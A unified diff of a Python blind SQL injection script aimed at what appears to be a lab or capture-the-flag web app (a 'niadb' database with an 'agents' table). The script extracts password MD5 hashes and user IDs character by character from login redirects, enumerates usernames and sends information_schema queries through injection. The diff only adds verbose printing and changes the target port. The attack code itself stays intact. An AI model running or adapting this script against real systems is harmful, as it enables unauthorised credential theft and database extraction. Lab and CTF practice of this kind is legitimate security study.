@@ -1,11 +1,10 @@
 import string
 import requests
 import random
-from threading import Thread
 
 phpsession = '13e4323d8265e2ec24c179464d20283d'
 
-def get_password(username, url='172.17.0.2'):
+def get_password(username, url='172.17.0.2', verbose=False):
     # Password MD5 Hash
     chars_lower = 'abcdef'
     alfabeto = string.digits + chars_lower + chars_lower.upper()
@@ -20,11 +19,12 @@ def get_password(username, url='172.17.0.2'):
             
             if response.url == f"http://{url}/welcome.php":
                 password += char
+                if verbose: print(f'Found: {char}')
                 break
     
     return password
 
-def get_id(username, url='172.17.0.2'):
+def get_id(username, url='172.17.0.2', verbose=False):
     alfabeto = string.digits
     
     id = ''
@@ -37,17 +37,18 @@ def get_id(username, url='172.17.0.2'):
             
             if response.url == f"http://{url}/welcome.php":
                 id += char
+                if verbose: print(f'Found: {char}')
                 break
     
     return id
 
-def enum_users(url='172.17.0.2'):
+def enum_users(url='172.17.0.2', verbose=False):
     alfabeto = string.digits + string.ascii_lowercase + string.punctuation
     alfabeto = [a for a in alfabeto]
 
     found = []
     for i in range(30):
-        print("Cerco user: #", i)
+        if verbose: print("Cerco user: #", i)
         random.shuffle(alfabeto)
         username = ''
         for _ in range(64):
@@ -69,7 +70,7 @@ def enum_users(url='172.17.0.2'):
                 break
 
         found.append(username)
-        print(username)
+        if verbose: print(username)
     return set(found)
 
 def inject_sql(command, url='172.17.0.2'):
@@ -92,9 +93,9 @@ def exec_sql(command, url='172.17.0.2'):
 
 
 if __name__ == '__main__':
-    #print(get_password('jackofspade', '127.0.0.1'))
-    #print(get_id('tizio.incognito', '127.0.0.1'))
-    #print(enum_users('127.0.0.1'))
+    #print(get_password('jackofspade', '127.0.0.1:8080'))
+    #print(get_id('tizio.incognito', '127.0.0.1:8080'))
+    print(enum_users('127.0.0.1:8080'))
 
     #inject_sql("(SELECT table_name FROM information_schema.tables WHERE table_schema LIKE 'niadb' LIMIT 0, 1)", '127.0.0.1')
     #inject_sql("(SELECT CONCAT(column_name, data_type) FROM information_schema.columns WHERE table_schema LIKE 'niadb' AND table_name LIKE 'agents' LIMIT 3, 1)", '127.0.0.1')
